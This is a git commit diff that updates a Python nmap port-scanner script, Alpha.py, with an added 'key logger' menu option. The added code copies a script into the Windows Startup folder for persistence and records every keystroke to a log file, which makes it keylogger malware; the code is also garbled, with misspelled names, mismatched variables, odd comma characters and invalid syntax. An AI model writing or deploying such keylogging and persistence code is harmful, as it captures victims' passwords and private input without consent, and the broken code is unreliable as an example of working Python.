c6310a99d8cc2f09a6c8cca8e8370502ea066a45
Yahye Abdirahman <68783841+fikrado@users.noreply.github.com>
2020-11-13 13:40:04 +0300

    Update Alpha.py

--- Alpha.py
+++ Alpha.py
@@ -1,9 +1,14 @@
 import nmap
 
+from pynput.keyboard import listener
+ 
+import os 
+import logging 
+from shutil import copyfile 
+
 scanner = nmap.Portscanner()
 
-print("______________________________")
-print("
+logo = """
         / \      _-'
       _/|  \-''- _ /
  __-' { |          \
@@ -22,7 +27,9 @@ print("
 ╚╝─╚╩═╣╔═╩╝╚╩╝╚╝
 ──────║║
 ──────╚╝
-")
+"""
+print("______________________________")
+print(logo)
 print("-------------------------------)
 
 ip_addr = input(" Please enter ip address ")
@@ -32,7 +39,8 @@ type(ip_addr)
 resp = input("""\nEnter the ip address you want to scan
                   1:SYN ACK scan
                   2:UDP scan
-                  3:Super scan \n""")
+                  3:Super scan
+                  4:key logger \n""")
 print("your option"‚ resp)
 
 if resp == '1':
@@ -56,7 +64,16 @@ elif resp == '3':
   print("ip statu: "‚ scanner[ip_addr].state())
   print(scanner[ip_addr].all_protocols())
   print("open ports: "‚ scanner[ip_addr]['tcp'].keys())
-else resp >= '4':
-  print("please enter a real option")
-  
+elif resp == '4':
+  username = os.getlogin()
+  login_directory = f"c:/User{username}/Desktop"
+  copyfile('Scanner.py'‚f'c:/User/{username}/AppDate/Roaming/Microsoft/Startup/Scannee.py')
+  logging.basicConfig(filename=f"{logging_directory}/mylog.txt"‚ level=logging.DEBUG‚ format="%(asctime)s: %(message)s")
+  def key_handler(key):
+    logging.info(key)
     
+    with Listener(on_pass=key hand) as listener:
+      listener.join()
+else resp >= '5':
+  print(logo)
+  print("please enter a real option")
